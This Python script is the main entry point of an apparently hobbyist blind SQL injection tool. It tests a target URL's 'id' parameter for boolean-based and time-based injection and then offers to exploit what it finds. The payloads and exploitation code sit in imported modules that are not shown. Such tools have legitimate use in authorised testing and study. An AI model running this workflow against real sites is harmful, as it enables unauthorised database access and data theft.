import argparse
from Modules.BooleanBasedSQLTester import test_boolean_based_sql_injection
from Modules.TimeBasedSQLTester import test_time_based_sql_injection
from Modules.URLUtils import extract_id
from Exploitation.Exploit import start_exploitation


def main():
    parser = argparse.ArgumentParser(description="Automate blind SQL injection tasks.")
    parser.add_argument("target_url", help="The URL of the vulnerable endpoint to target")
    args = parser.parse_args()
    target_url = args.target_url
    id_value = extract_id(target_url)
    if id_value:
        detected_vulnerabilities = []
        exploitable_payloads = []

        vulnerability_type, exploitable_payload, default_response = test_boolean_based_sql_injection(target_url, id_value)
        if exploitable_payload:
            exploitable_payloads.append(exploitable_payload)
        if vulnerability_type == "boolean":
            print(f"Boolean-based SQL injection vulnerability detected with this payload: {exploitable_payload}.")
            detected_vulnerabilities.append("boolean")
        else:
            print("No Boolean-based SQL injection vulnerability detected.")

        test_time_based = input("Do you want to test for Time-based SQL injection as well? (y/n): ").strip().lower()

        if test_time_based == 'y':
            time_based_vulnerability, exploitable_payload = test_time_based_sql_injection(target_url, id_value)
            exploitable_payloads.append(exploitable_payload)
            if time_based_vulnerability == "time-based":
                print(f"Time-based SQL injection vulnerability detected with this payload: {exploitable_payload}.\n")
                detected_vulnerabilities.append("time-based")
            else:
                print("No Time-based SQL injection vulnerability detected.")

        if detected_vulnerabilities:
            print("\nDetected Vulnerabilities:")
            for idx, vulnerability in enumerate(detected_vulnerabilities, start=1):
                print(f"{idx}. {vulnerability.capitalize()} SQL Injection")

            while True:
                exploit_option = input("\nDo you want to attempt exploitation? (y/n): ").strip().lower()

                if exploit_option == 'y':
                    while True:
                        try:
                            choice = int(input(
                                f"Choose a vulnerability to exploit (1-{len(detected_vulnerabilities)}): ").strip())
                            if 1 <= choice <= len(detected_vulnerabilities):
                                selected_vulnerability = detected_vulnerabilities[choice - 1]
                                ExploitablePayload = exploitable_payloads[choice - 1]
                                print(f"Exploiting {selected_vulnerability} vulnerability...")
                                start_exploitation(default_response, target_url, id_value, selected_vulnerability, ExploitablePayload)
                                break
                            else:
                                print(
                                    f"Invalid choice, please choose a number between 1 and {len(detected_vulnerabilities)}.")
                        except ValueError:
                            print("Invalid input. Please enter a valid number.")
                    break
                elif exploit_option == 'n':
                    print("No exploitation performed.")
                    break
                else:
                    print("Invalid input. Please enter 'y' or 'n'.")
        else:
            print("No vulnerability detected to exploit.")

    else:
        print("Error: No 'id' parameter found in the URL.")


if __name__ == "__main__":
    main()
